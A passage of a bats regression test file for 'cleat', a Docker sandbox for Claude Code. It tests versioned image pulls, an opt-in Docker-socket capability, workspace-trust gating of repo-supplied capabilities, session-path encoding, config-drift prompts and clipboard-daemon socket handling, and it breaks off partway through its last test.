# v0.9.2: first-run path in cmd_run called _do_build directly, skipping the
# remote pull entirely. Users got a 2-5 min local build on every clean install
# even though ghcr.io/cleatdev/cleat was already publishing matching images.
# The pull path only fired from `cleat build`, which no one types on first run.
# Fix: cmd_run's missing-image branch now calls `_do_pull || _do_build`.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v0.9.2: cmd_run attempts pull before building on first run" {
  # No image exists yet, mimic a clean install.
  mock_docker_images ""
  mkdir -p "$TEST_TEMP/project"

  run cmd_run "$TEST_TEMP/project"
  assert_success

  # docker pull must have been called (the new first-run path).
  run grep '^docker pull ' "$DOCKER_CALLS"
  assert_success
  assert_output --partial "$REGISTRY_BASE"

  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"
  rm -rf "$CLEAT_RUN_DIR/${cname}/settings" "$CLEAT_RUN_DIR/${cname}/hooks"
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.9.2: REGISTRY_IMAGE was hardcoded to ":latest", ignoring the installed
# CLI's VERSION. The moment GHCR holds a newer tag than the installed CLI,
# :latest pulls an image the CLI wasn't tested against. Concept doc
# (14-v090-execution-plan.md) explicitly requires version tag matching.
# Fix: REGISTRY_IMAGE is derived from $VERSION at load time.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v0.9.2: registry image tag matches CLI version" {
  # REGISTRY_IMAGE should end with :v${VERSION}, not :latest or anything else.
  [[ "$REGISTRY_IMAGE" == "${REGISTRY_BASE}:v${VERSION}" ]] || {
    echo "REGRESSION: REGISTRY_IMAGE='$REGISTRY_IMAGE' does not match v${VERSION}"
    return 1
  }
  # And the pull command in _do_pull must go against that version-tagged URL.
  mock_docker_images ""
  mkdir -p "$TEST_TEMP/project"
  run cmd_run "$TEST_TEMP/project"
  assert_success

  run grep '^docker pull ' "$DOCKER_CALLS"
  assert_success
  assert_output --partial ":v${VERSION}"
  refute_output --partial ":latest"

  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"
  rm -rf "$CLEAT_RUN_DIR/${cname}/settings" "$CLEAT_RUN_DIR/${cname}/hooks"
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.9.2: bin/cleat's spin_stop also used \r without \033[K, so a shorter
# success message left the tail of the longer spinner line visible. Example:
# "Starting container..." (21 chars) overwritten by "Container started"
# (17 chars) produced "Container startedr..." with the leftover "r..." in
# the spinner's dim color. Same bug as install.sh, different file.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v0.9.2: bin/cleat spin_stop clears line before writing" {
  # Extract color vars + spin_stop from bin/cleat into an isolated harness,
  # force _is_tty true, and call spin_stop with a shorter success message.
  local harness="$TEST_TEMP/cleat_spin_stop_harness.sh"
  {
    echo '#!/usr/bin/env bash'
    echo '_is_tty() { true; }'
    echo '_has_unicode() { true; }'
    echo '_SPIN_PID=""'
    sed -n "/^BOLD='/,/^RESET='/p" "$CLI"
    sed -n '/^spin_stop()/,/^}$/p' "$CLI"
    echo 'spin_stop 0 "Container started"'
  } > "$harness"

  run bash "$harness"
  assert_success
  assert_output --partial "Container started"

  # Output must contain CR + "clear to EOL" so a shorter success line fully
  # replaces a longer spinner line.
  local clear_seq
  clear_seq=$'\r\033[K'
  [[ "$output" == *"$clear_seq"* ]] || {
    echo "REGRESSION: bin/cleat spin_stop output missing \\r\\033[K line-clear prefix"
    return 1
  }
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.10.0: docker capability. The headline feature: opt-in access to the
# host Docker daemon so users can test docker-based apps (compose, exec,
# build) without leaving the sandbox. Full design in
# concept/15-docker-capability.md.
#
# The three invariants that must hold:
#   1. `docker` is in KNOWN_CAPS (so config --list/--enable work)
#   2. When the cap is active, /var/run/docker.sock is mounted
#   3. When active, project is also mounted at its host path with workdir
#      set there (so $(pwd) in Cleat == $(pwd) on host, the path-remapping
#      ergonomic fix)
# ─────────────────────────────────────────────────────────────────────────────

@test "regression v0.10.0: docker listed in KNOWN_CAPS" {
  # Guards against accidental removal during cap-list refactors.
  local found=0
  for cap in "${KNOWN_CAPS[@]}"; do
    if [[ "$cap" == "docker" ]]; then found=1; fi
  done
  [[ $found -eq 1 ]] || {
    echo "REGRESSION: docker missing from KNOWN_CAPS (${KNOWN_CAPS[*]})"
    return 1
  }
}

@test "regression v0.10.0: docker cap mounts host socket" {
  mock_docker_images "cleat"
  mkdir -p "$TEST_TEMP/project"
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"

  # Pin the daemon location so the branch is deterministic across the matrix:
  # host-local daemon whose socket resolves to /var/run/docker.sock.
  unset DOCKER_HOST
  _docker_pool_is_vm() { return 1; }
  _docker_context_endpoint() { echo "unix:///var/run/docker.sock"; }

  cat > "$CLEAT_GLOBAL_CONFIG" << 'EOF'
[caps]
docker
EOF

  run cmd_run "$TEST_TEMP/project"
  assert_success
  run assert_docker_run_has "$cname" "/var/run/docker.sock:/var/run/docker.sock"
  assert_success

  rm -rf "$CLEAT_RUN_DIR/${cname}/settings" "$CLEAT_RUN_DIR/${cname}/hooks"
}

@test "regression v0.10.0: docker cap mounts project at host path with workdir" {
  # This is the path-remapping fix: inside Cleat, /workspace and the host
  # path both point to the same project, and workdir is set to the host
  # path so $(pwd) returns something the host daemon can find.
  mock_docker_images "cleat"
  mkdir -p "$TEST_TEMP/project"
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"

  cat > "$CLEAT_GLOBAL_CONFIG" << 'EOF'
[caps]
docker
EOF

  run cmd_run "$TEST_TEMP/project"
  assert_success
  run assert_docker_run_has "$cname" "$TEST_TEMP/project:$TEST_TEMP/project"
  assert_success
  run assert_docker_run_has "$cname" "--workdir $TEST_TEMP/project"
  assert_success

  rm -rf "$CLEAT_RUN_DIR/${cname}/settings" "$CLEAT_RUN_DIR/${cname}/hooks"
}

@test "regression v0.10.0: docker cap off leaves baseline mounts unchanged" {
  # Docker cap is opt-in; enabling other caps must not accidentally add the
  # socket or host-path mount.
  mock_docker_images "cleat"
  mkdir -p "$TEST_TEMP/project"
  mkdir -p "$HOME/.ssh"
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"

  cat > "$CLEAT_GLOBAL_CONFIG" << 'EOF'
[caps]
ssh
gh
EOF

  run cmd_run "$TEST_TEMP/project"
  assert_success
  run assert_docker_run_lacks "$cname" "/var/run/docker.sock"
  assert_success
  run assert_docker_run_lacks "$cname" "--workdir"
  assert_success

  rm -rf "$CLEAT_RUN_DIR/${cname}/settings" "$CLEAT_RUN_DIR/${cname}/hooks"
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.10.0: workspace trust. A project's .cleat file lives in the repo and is
# untrusted input. Applying its caps without user approval was the original
# supply-chain footgun (any repo could silently enable ssh/gh/docker on
# clone+run). Workspace trust closes that: project caps require approval
# via prompt, --trust-project flag, CLEAT_TRUST_PROJECT=1 env, or a stored
# approval whose hash still matches the current .cleat caps.
#
# Core invariants:
#   1. Non-interactive + no opt-in → project caps are DROPPED (default-deny)
#   2. Hash is over canonical caps, not raw file: comment edits don't
#      require re-approval
#   3. Global config + --cap CLI flags are never gated (user's own input)
#   4. cleat status never prompts (readonly mode)
#   5. Trust file refuses paths with tab/newline (format corruption)
# ─────────────────────────────────────────────────────────────────────────────

@test "regression v0.10.0: non-TTY + no opt-in skips project .cleat caps" {
  # The supply-chain protection: a malicious repo's .cleat with docker
  # can't silently activate in scripted/CI contexts.
  unset CLEAT_TRUST_PROJECT
  mkdir -p "$TEST_TEMP/proj"
  printf '[caps]\ndocker\n' > "$TEST_TEMP/proj/.cleat"
  _is_tty() { return 1; }

  resolve_caps "$TEST_TEMP/proj" >/dev/null 2>&1
  cap_is_active docker && {
    echo "REGRESSION: docker cap leaked from untrusted .cleat in non-TTY mode"
    return 1
  }
  return 0
}

@test "regression v0.10.0: global config is never gated by trust" {
  # The trust check applies only to project-level .cleat files. The user's
  # own global config must continue to work without any approval flow.
  unset CLEAT_TRUST_PROJECT
  mkdir -p "$TEST_TEMP/proj"
  touch "$HOME/.gitconfig"
  cat > "$CLEAT_GLOBAL_CONFIG" << 'EOF'
[caps]
git
EOF
  _is_tty() { return 1; }
  resolve_caps "$TEST_TEMP/proj" >/dev/null 2>&1
  cap_is_active git || {
    echo "REGRESSION: global config cap was dropped"
    return 1
  }
}

@test "regression v0.10.0: trust hash is over canonical caps (comment-edit safe)" {
  mkdir -p "$TEST_TEMP/proj"
  printf '[caps]\ngit\nssh\n' > "$TEST_TEMP/proj/.cleat"
  local h1 h2
  h1="$(_hash_cleat_caps "$TEST_TEMP/proj/.cleat" "")"
  # Rewrite the file with comments and reordered caps. Same cap set.
  printf '# this is a comment\n[caps]\nssh\n# another comment\ngit\n' > "$TEST_TEMP/proj/.cleat"
  h2="$(_hash_cleat_caps "$TEST_TEMP/proj/.cleat" "")"
  [[ -n "$h1" && "$h1" == "$h2" ]] || {
    echo "REGRESSION: comment/order-only .cleat changes altered the trust hash"
    echo "h1=$h1 h2=$h2"
    return 1
  }
}

@test "regression v0.10.0: trust file refuses control chars in project path" {
  # Tab/newline would corrupt the field- and line-oriented trust file.
  run _trust_record "$(printf '/foo\tbar')" "hash"
  assert_failure
  run _trust_record "$(printf '/foo\nbar')" "hash"
  assert_failure
}

@test "regression v0.10.0: trust hash is pure hex (md5sum junk stripped)" {
  # `md5sum` on Linux appends "  -" (the stdin "filename") after the hash.
  # Without stripping, the stored trust hash contains spaces and "-", which
  # corrupts the tab-separated trust file and breaks lookup. The hash in
  # _hash_cleat_caps must be piped through `awk '{print $1}'` (or
  # equivalent) so only hex survives.
  mkdir -p "$TEST_TEMP/proj"
  printf '[caps]\ngit\nssh\n' > "$TEST_TEMP/proj/.cleat"
  local h
  h="$(_hash_cleat_caps "$TEST_TEMP/proj/.cleat" "")"
  [[ "$h" =~ ^[0-9a-f]+$ ]] || {
    echo "REGRESSION: trust hash contains non-hex chars: '$h'"
    return 1
  }
}

@test "regression v0.10.0: cleat resume after cleat rm creates container and continues" {
  # cleat rm preserves sessions on the host: they live at
  # ~/.claude/projects/<key>/ and aren't touched by cmd_rm. But before
  # this fix, cleat resume errored out with "No container found" when
  # the container was gone, so the user couldn't actually pick up their
  # session without doing `cleat start` (which launches fresh, without
  # --continue). Now cmd_resume auto-creates the container and exec_claude
  # fires --continue so Claude resumes from the persisted host files.
  mock_docker_images "cleat"
  mkdir -p "$TEST_TEMP/project"
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"

  run cmd_resume "$TEST_TEMP/project"
  assert_success

  # docker run happened: container was created fresh, not errored.
  run grep "^docker run " "$DOCKER_CALLS"
  assert_success
  assert_output --partial "--name $cname"

  rm -rf "$CLEAT_RUN_DIR/${cname}/settings" "$CLEAT_RUN_DIR/${cname}/hooks"
}

@test "regression v0.10.0: cmd_rm leaves per-project session dir untouched" {
  # The host session dir at ~/.claude/projects/<key>/ must survive cmd_rm
  # so `cleat resume` (which now auto-creates a fresh container) can
  # --continue from those files.
  mock_docker_images "cleat"
  mkdir -p "$TEST_TEMP/project"
  mock_docker_ps_a "$(container_name_for "$TEST_TEMP/project")"

  # Compute the session dir path the way bin/cleat does.
  local _bn _h project_key session_dir
  _bn="$(basename "$TEST_TEMP/project" | tr '[:upper:]' '[:lower:]' | sed 's/[^a-z0-9-]/-/g')"
  _h="$(echo -n "$TEST_TEMP/project" | _md5 | head -c 8)"
  project_key="${_bn}-${_h}"
  session_dir="${HOME}/.claude/projects/${project_key}"

  mkdir -p "$session_dir"
  echo '{"session":"data"}' > "$session_dir/session-abc.jsonl"

  run cmd_rm "$TEST_TEMP/project"
  assert_success

  [[ -f "$session_dir/session-abc.jsonl" ]] || {
    echo "REGRESSION: cmd_rm deleted the per-project session dir"
    return 1
  }
  local content
  content="$(cat "$session_dir/session-abc.jsonl")"
  [[ "$content" == '{"session":"data"}' ]] || {
    echo "REGRESSION: session content mangled by cmd_rm"
    return 1
  }
}

@test "regression v0.10.0: docker cap overlays session dir at host-path key" {
  # With docker cap active, workdir is the host path, so Claude encodes
  # its session dir from that path ('/a/b' → 'projects/-a-b/') instead
  # of the v0.8.0-assumed 'projects/-workspace/'. Without a second
  # overlay, sessions would split between two host dirs (one per-project,
  # one in the base ~/.claude/projects/<host-path-encoded>/). The docker
  # cap block must mount the per-project session dir at the host-path key
  # so sessions always land in the same place regardless of workdir.
  mock_docker_images "cleat"
  mkdir -p "$TEST_TEMP/project"
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"

  cat > "$CLEAT_GLOBAL_CONFIG" << 'EOF'
[caps]
docker
EOF

  run cmd_run "$TEST_TEMP/project"
  assert_success

  # Host-path key is the project path as Claude Code encodes it: every '/' AND
  # every '.' becomes a dash.
  #
  # This assertion originally hardcoded slash-only replacement, and it passed
  # because the code did the same thing. Both were wrong. Measured against a
  # live box on 2026-07-29, Claude reported its own session path for a workspace
  # under /Users/marcin/.config/... as -Users-marcin--config-..., a DOUBLE dash
  # where "/." appeared. So the docker cap's session unification silently missed
  # for every project path containing a dot, which this test's own mktemp dir
  # (/tmp/tmp.XXXX) is an example of. Now shares one encoder with the overlay
  # generator, so the two cannot drift apart again.
  local host_key
  host_key="$(_claude_session_key "$TEST_TEMP/project")"
  run assert_docker_run_has "$cname" ":/home/coder/.claude/projects/${host_key}"
  assert_success
  # and the encoding is really the dotted one, not slash-only
  case "$TEST_TEMP" in
    *.*) case "$host_key" in
           *.*) echo "key kept a dot: $host_key"; return 1 ;;
         esac ;;
  esac

  rm -rf "$CLEAT_RUN_DIR/${cname}/settings" "$CLEAT_RUN_DIR/${cname}/hooks"
}

@test "regression v0.10.0: cmd_status never prompts for trust" {
  # cleat status is read-only. Any trust prompt from it would surprise users
  # and could deadlock scripts that pipe through status.
  unset CLEAT_TRUST_PROJECT
  mkdir -p "$TEST_TEMP/proj"
  printf '[caps]\ndocker\n' > "$TEST_TEMP/proj/.cleat"
  _is_tty() { return 0; }
  mock_docker_images ""
  run cmd_status "$TEST_TEMP/proj"
  assert_success
  refute_output --partial "Trust this project"
  refute_output --partial "Project .cleat"
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.10.1: _do_pull always issued a `docker pull` against GHCR, even when
# the version-tagged image was already on disk. A transient registry/network
# error there (offline, GHCR hiccup, auth blip) returned non-zero from
# `docker pull`, which the caller treated as "image unavailable" and fell
# back to a 2-5 min local build, even though the prebuilt image was
# sitting in the local image store waiting to be reused.
# Fix: short-circuit at the top of _do_pull. If `docker image inspect
# ${REGISTRY_BASE}:v${target_version}` succeeds, retag locally and return
# without any network call.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v0.10.1: _do_pull reuses locally cached prebuilt without network call" {
  # Registry-tagged image is on disk but no `cleat` alias. Pull would fail
  # by default (DOCKER_PULL_EXIT_CODE=1), so if _do_pull touched the
  # network it would fall back to a local build, both forbidden here.
  mock_docker_image_cached "$REGISTRY_IMAGE"
  mkdir -p "$TEST_TEMP/project"

  run cmd_run "$TEST_TEMP/project"
  assert_success

  run grep '^docker pull ' "$DOCKER_CALLS"
  assert_failure

  run docker_build_calls
  assert_output ""

  # The cached registry tag was aliased to the local IMAGE_NAME.
  run grep '^docker tag ' "$DOCKER_CALLS"
  assert_success
  assert_output --partial "$REGISTRY_IMAGE"
  assert_output --partial "$IMAGE_NAME"

  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"
  rm -rf "$CLEAT_RUN_DIR/${cname}/settings" "$CLEAT_RUN_DIR/${cname}/hooks"
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.10.1 hardening: the cache short-circuit must not declare success when
# `docker tag` silently fails. Without the fall-through guard, a tag failure
# would leave no `cleat` alias on disk while _do_pull returned 0; the next
# image_exists() check would say "missing" and the user would be back to a
# local build the next time they ran `cleat start`. The guard re-checks
# image_exists() after the tag and falls through to the pull path on
# failure, preserving the GHCR-first contract even when the local image
# store is in a degraded state.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v0.10.1: _do_pull falls through to network pull when cache-hit tag fails" {
  # Registry-tagged image is on disk, but `docker tag` fails (simulating
  # disk full / permission / etc.). _do_pull must not falsely claim
  # success. It must fall through to the existing pull path. Pull is
  # made to succeed so we can prove the fall-through fired (otherwise
  # we'd land in _do_build and the assertion below would be ambiguous).
  mock_docker_image_cached "$REGISTRY_IMAGE"
  export DOCKER_TAG_EXIT_CODE=1
  export DOCKER_PULL_EXIT_CODE=0

  run cmd_build
  assert_success

  # The fall-through warning must be visible to the user.
  assert_output --partial "could not be tagged"

  # Network pull was attempted (proves we fell through past the cache hit).
  run grep '^docker pull ' "$DOCKER_CALLS"
  assert_success
  assert_output --partial "$REGISTRY_IMAGE"

  unset DOCKER_TAG_EXIT_CODE DOCKER_PULL_EXIT_CODE
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.12.1: `cleat config --enable hooks && cleat` did nothing useful: the
# existing container kept its old mount set (no /var/log/cleat), so hooks
# silently never fired. Drift was detected but the response was a static
# "Run: cleat rm && cleat" notice, invisible to most users.
#
# Fix: cmd_start / cmd_resume / cmd_claude now call _resolve_config_drift
# early, before any docker operation, so a drifted TTY session prompts the
# user to recreate. Without the wiring, the existing capabilities.bats unit
# tests for _resolve_config_drift still pass. This regression pins the
# wiring itself.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v0.12.1: cmd_start invokes _resolve_config_drift before docker ops" {
  mkdir -p "$TEST_TEMP/project"
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"
  mock_docker_images "cleat"
  mock_docker_ps_a "$cname"
  is_running() { return 1; }
  exec_claude() { return 0; }

  # Settings overlay must exist or the unrelated stale-mount path fires
  mkdir -p "$CLEAT_RUN_DIR/${cname}/settings"
  echo '{}' > "$CLEAT_RUN_DIR/${cname}/settings/settings.json"

  # Sentinel: set by the spy below if the wiring is intact
  DRIFT_CALLED=0
  _resolve_config_drift() { DRIFT_CALLED=1; }

  cmd_start "$TEST_TEMP/project"

  [[ "$DRIFT_CALLED" == "1" ]] || {
    echo "REGRESSION: cmd_start did not call _resolve_config_drift"
    return 1
  }
}

# v0.12.1 shipped the drift recreate prompt with `echo -n` instead of
# `echo -en`, so ${BOLD}/${RESET} printed as literal `\033[1m`/`\033[0m`
# instead of being interpreted as ANSI escape sequences. The user saw a
# garbled prompt: `Recreate \033[1mcleat-foo\033[0m now? [Y/n]`.
@test "regression v0.12.1: drift recreate prompt interprets ANSI escapes" {
  run bash -c '
    source "'"$CLI"'"
    container_exists() { return 0; }
    _container_config_hash() { echo "v2:old"; }   # current format, so drift is compared (v0.16.4)
    compute_config_fingerprint() { echo "new"; }
    _is_tty() { return 0; }
    is_running() { return 1; }
    export DOCKER_CALLS="'"$DOCKER_CALLS"'" PATH="'"$MOCK_BIN"':$PATH"
    echo "y" | _resolve_config_drift "cleat-foo" ""
  '
  assert_success
  # Bug present → output contains the 7-char literal sequence.
  # Fix in place → those characters appear only as the actual ESC byte + `[1m`,
  # so the literal substring isn't found.
  refute_output --partial '\033[1m'
  refute_output --partial '\033[0m'
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.12.3: `cleat start` aborted with an opaque OCI runtime error
# ("not a directory: Are you trying to mount a directory onto a file...")
# when the settings-overlay dir survived but a specific file inside was
# missing. The pre-fix stale-mount check only verified `[[ -d $overlay_dir ]]`,
# so the partial-rotation state slipped past the gate, fell through to
# `docker start`, and let Docker auto-create the missing bind source as a
# directory, which then failed to mount onto the file destination inside
# the container. Reported in the wild after a long session: user declined
# the drift recreate prompt, container start failed with the OCI error,
# leaving them stuck.
#
# Fix: _settings_overlay_intact also enumerates the container's bind
# sources via `docker inspect` and verifies each one inside the overlay
# dir is a regular file before docker start. When any source is missing
# or the wrong type, cmd_start auto-recreates (the alternative is the
# same opaque failure they hit in production).
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v0.12.3: cmd_start auto-recreates when overlay dir survives but a file is missing" {
  mock_docker_images "cleat"
  mkdir -p "$TEST_TEMP/project"
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"
  is_running() { return 1; }
  mock_docker_ps_a "$cname"

  # Overlay dir survives with settings.json, but the container's mount set
  # still references project-settings.local.json which was rotated out.
  # This is the exact partial-rotation state the dir-only check missed.
  local overlay_dir="$CLEAT_RUN_DIR/${cname}/settings"
  mkdir -p "$overlay_dir"
  echo '{}' > "$overlay_dir/settings.json"
  # docker inspect must report both sources so the helper can spot the
  # missing one. The mock returns this for ALL inspect calls in this test,
  # fine because _container_config_hash isn't on the cmd_start path
  # under the bypassed _resolve_config_drift in setup().
  mock_docker_inspect "${overlay_dir}/settings.json
${overlay_dir}/project-settings.local.json"

  run cmd_start "$TEST_TEMP/project"
  assert_success
  assert_output --partial "Recreating container"
  assert_output --partial "host paths changed"
  run docker_calls
  assert_output --partial "docker rm -f $cname"
  assert_output --partial "docker run"
  refute_output --partial "docker start $cname"

  rm -rf "$overlay_dir" "$CLEAT_RUN_DIR/${cname}/clip"
}

# ── v0.13.0: `./test.sh` must not hang on an interactive terminal ────────────
# The open-bridge shim (installed in the container as open/xdg-open) read fd0
# via `cat` when invoked with no URL. The open-bridge "rejects empty input" test
# in hooks.bats runs it with an empty arg; when `./test.sh` is run in a terminal
# (stdin = TTY, inherited through bats), `cat` blocked forever and the whole
# suite hung at the hooks file. Two complementary guards below.

@test "regression v0.13.0: open-bridge does not read stdin when fd0 is a tty" {
  # Root-cause fix lives in the shipped shim: it must guard the `cat` read behind
  # a "not a terminal" check so an interactive `open`/`xdg-open` with no argument
  # (and the empty-input test) falls through to usage instead of blocking. A pipe
  # is still consumed because a pipe is not a tty.
  local script="$PROJECT_ROOT/docker/open-bridge"
  [[ -f "$script" ]] || { echo "open-bridge shim missing"; return 1; }
  grep -qE '\[ *! -t 0 *\]' "$script" || {
    echo "open-bridge reads stdin without a tty guard; interactive use can hang"
    return 1
  }
}

@test "regression v0.13.0: test runner isolates bats stdin from the terminal" {
  # Defense in depth: the per-file loop must run bats with stdin from /dev/null
  # so any future test that reads fd0 gets EOF (matching CI) instead of blocking
  # on the developer's terminal.
  local runner="$PROJECT_ROOT/test.sh"
  [[ -f "$runner" ]] || { echo "test.sh missing"; return 1; }
  grep -qE '"\$BATS" "\$f".*</dev/null' "$runner" || {
    echo "test.sh runs bats without </dev/null; interactive ./test.sh can hang"
    return 1
  }
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.13.1: two bugs surfaced when the v0.13.0 upgrade forced a container
# recreate on a macOS host (host uid 501, image-baked coder uid 1000):
#
#   (A) FREEZE: v0.13.0 made ~/.local writable, re-enabling Claude Code's
#       launch-time self-updater, which hangs the TUI under `docker exec -it` on
#       a fresh container. Fix: disable it via DISABLE_AUTOUPDATER=1 in the
#       session env: cleat owns Claude's version (image + `cleat upgrade-claude`).
#
#   (B) CLIP EPERM STORM: `docker exec ... runuser -u coder` could fire before
#       the entrypoint finished remapping coder 1000→501, so clip-daemon stamped
#       /tmp/clip.* as uid 1000; later 501 sessions couldn't unlink them from the
#       sticky /tmp. Fixes: wait for the remap before exec, AND give clip-daemon a
#       per-uid runtime dir so two uids can never collide on one socket.
# ─────────────────────────────────────────────────────────────────────────────

@test "regression v0.13.1: session env disables Claude's launch-time auto-updater" {
  # The freeze cause was Claude's in-container self-updater running at launch.
  # Cleat manages Claude's version itself, so the session must pass
  # DISABLE_AUTOUPDATER=1 to claude.
  _host_open_cmd() { echo ""; }
  run exec_claude "test-ctr" --dangerously-skip-permissions
  assert_success
  run assert_docker_exec_has "DISABLE_AUTOUPDATER=1"
  assert_success
}

@test "regression v0.13.1: session waits for the UID remap before launching" {
  # The wrong-uid / clip-EPERM cause was the session exec racing the entrypoint's
  # /etc/passwd remap. exec_claude must probe `id -u coder` in the container
  # before launching, so clip-daemon and claude never run as the stale image uid.
  _host_open_cmd() { echo ""; }
  run exec_claude "test-ctr" --dangerously-skip-permissions
  assert_success
  run assert_docker_exec_has "id -u coder"
  assert_success
}

@test "regression v0.13.1: clip-daemon uses a per-uid runtime dir, not shared /tmp/clip.sock" {
  # Stale, foreign-owned /tmp/clip.sock in the sticky /tmp was the wedge. The
  # daemon must honor CLEAT_CLIP_DIR (a per-uid dir) for its socket so two uids
  # can never collide. Stub socat so we observe the bind path without listening.
  local rundir="$TEST_TEMP/clip-run"
  local stubs="$TEST_TEMP/clipd-stubs"; mkdir -p "$stubs" "$rundir"
  local socat_log="$TEST_TEMP/socat-args.log"; : > "$socat_log"
  printf '#!/bin/sh\necho "$@" >> "%s"\nexit 0\n' "$socat_log" > "$stubs/socat"
  chmod +x "$stubs/socat"
  run env PATH="$stubs:$PATH" CLEAT_CLIP_DIR="$rundir" bash "$PROJECT_ROOT/docker/clip-daemon"
  run cat "$socat_log"
  assert_output --partial "$rundir/clip.sock"
}

@test "regression: clip-daemon passes socat an inactivity timeout (-T) so hung handlers can't exhaust PIDs" {
  # A client that connects but never sends/closes left a handler hung on
  # `head -c` forever; accumulated hung handlers were the fork-storm. The
  # listener must carry socat's -T inactivity timeout.
  local rundir="$TEST_TEMP/clip-run"
  local stubs="$TEST_TEMP/clipd-stubs"; mkdir -p "$stubs" "$rundir"
  local socat_log="$TEST_TEMP/socat-args.log"; : > "$socat_log"
  printf '#!/bin/sh\necho "$@" >> "%s"\nexit 0\n' "$socat_log" > "$stubs/socat"
  chmod +x "$stubs/socat"
  run env PATH="$stubs:$PATH" CLEAT_CLIP_DIR="$rundir" bash "$PROJECT_ROOT/docker/clip-daemon"
  run cat "$socat_log"
  assert_output --partial "-T 5"
}

@test "regression v0.13.1: clip shim and clip-daemon resolve the SAME socket path" {
  # The OSC52 fallback only works if `clip` connects to the exact socket
  # clip-daemon binds. Both derive it from CLEAT_CLIP_DIR / the per-uid dir; a
  # divergence (e.g. one left at /tmp/clip.sock) silently breaks paste. Evaluate
  # the real assignment lines from each shipped script and compare.
  local daemon_sock clip_sock
  daemon_sock="$(CLEAT_CLIP_DIR=/probe bash -c 'eval "$(grep -E "^(RUNDIR|SOCK)=" "'"$PROJECT_ROOT/docker/clip-daemon"'")"; printf %s "$SOCK"')"
  clip_sock="$(CLEAT_CLIP_DIR=/probe bash -c 'eval "$(grep -E "^SOCK=" "'"$PROJECT_ROOT/docker/clip"'")"; printf %s "$SOCK"')"
  assert_equal "$daemon_sock" "/probe/clip.sock"
  assert_equal "$clip_sock" "/probe/clip.sock"
  assert_equal "$clip_sock" "$daemon_sock"
}

@test "regression v0.15.0: browser bridge consumes each URL once (no per-watcher duplicate opens)" {
  # A session that dies without its cleanup trap (crash / SIGKILL / closed
  # terminal) orphans its disowned _browser_watcher. The next session on the same
  # cname reuses the clip dir and starts ANOTHER watcher, so N watchers each open
  # every URL → one in-container `open` produced N host tabs. The fix consumes
  # the bridge file with an atomic rename: exactly one watcher claims each URL.
  local bridge="$TEST_TEMP/.browser-open"
  printf '%s\n' "https://example.com/oauth" > "$bridge"
  # Two watchers racing the same bridge file (orphan + current).
  run _browser_claim_url "$bridge"
  assert_success
  assert_output --partial "https://example.com/oauth"
  # The second watcher must find nothing: one tab, not two.
  run _browser_claim_url "$bridge"
  assert_failure
}

# v0.15.0: the config-drift notice shipped as a cyan-bordered _notice_box with
# blank-line padding. It now renders as plain text in the "New in v…" style (no
# box, no empty lines), per the maintainer's startup-output taste. The bug we
# guard against is the bordered box returning. Exercises the non-TTY branch
# (no prompt) so the whole notice is in captured output; mutating that branch's
# `info` back to `_notice_box` reintroduces the border and trips the refutes.
@test "regression v0.15.0: config-drift notice is plain text, not a box" {
  run bash -c '
    source "'"$CLI"'"
    container_exists() { return 0; }
    _container_config_hash() { echo "v2:old"; }   # current format, so drift is compared (v0.16.4)
    compute_config_fingerprint() { echo "new"; }
    _is_tty() { return 1; }
    _resolve_config_drift "cleat-foo" ""
  '
  assert_success
  assert_output --partial "Config changed"
  assert_output --partial "cleat-foo"
  refute_output --partial "┌"
  refute_output --partial "└"
  refute_output --partial "│"
}

# v0.15.0: the image-rebuild prompt opened with a stray `echo ""`, leaving a
# blank line between the preceding "✔ Removed …" (drift recreate) and the
# notice, visible in the wild on a drift→rebuild startup. The leading blank is
# gone; the notice is now the first byte of output. Command substitution strips
# trailing newlines but PRESERVES a leading one, so re-adding `echo ""` makes
# $out start with a newline and trips the guard.
@test "regression v0.15.0: image-rebuild notice has no leading blank line" {
  _is_tty() { return 0; }
  image_exists() { return 0; }
  # Pre-stamping image older than the content intro → prompt fires.
  _image_spec_version() { echo ""; }
  _image_cleat_version() { echo "0.0.1"; }
  cmd_rebuild() { :; }
  container_exists() { return 1; }
  is_running() { return 1; }
  _REBUILD_PROMPTED=0
  local out
  out="$(_maybe_prompt_image_rebuild "cleat-x-12345678" <<< "n" 2>&1)"
  [[ "$out" == *"out of date"* ]] \
    || { echo "notice missing: $out"; return 1; }
  [[ "$out" != $'\n'* ]] \
    || { echo "REGRESSION: leading blank line before rebuild notice"; return 1; }
}

@test "regression v0.15.0: version bump alone does not trigger config drift" {
  # The config fingerprint must depend ONLY on caps + env keys, never the CLI
  # version. Folding version in made every release fire a false "caps or env
  # keys differ" drift notice on existing containers whose setup was untouched,
  # with a remedy (recreate from the same image) that fixes nothing for a
  # version change. Version drift is _maybe_prompt_image_rebuild's job.
  run bash -c '
    source "'"$CLI"'"
    ACTIVE_CAPS=(git env)
    _RESOLVED_ENV_ARGS=(-e "FOO=bar")
    VERSION="0.14.0"; h1="$(compute_config_fingerprint)"
    VERSION="0.15.0"; h2="$(compute_config_fingerprint)"
    [[ "$h1" == "$h2" ]] || { echo "DRIFTED: $h1 vs $h2" >&2; exit 1; }
    echo "STABLE"
  '
  assert_success
  assert_output --partial "STABLE"
}

@test "regression: caps reader keeps a final line that lacks a trailing newline" {
  # A hand-edited .cleat ending in a capability with no trailing newline
